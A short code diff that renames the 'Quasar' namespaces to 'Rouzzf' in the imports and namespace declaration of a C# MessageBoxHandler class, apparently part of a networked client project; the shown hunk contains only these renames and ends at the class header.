@@ -1,10 +1,10 @@
-﻿using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 using System;
 using System.Threading;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class MessageBoxHandler : IMessageProcessor
     {
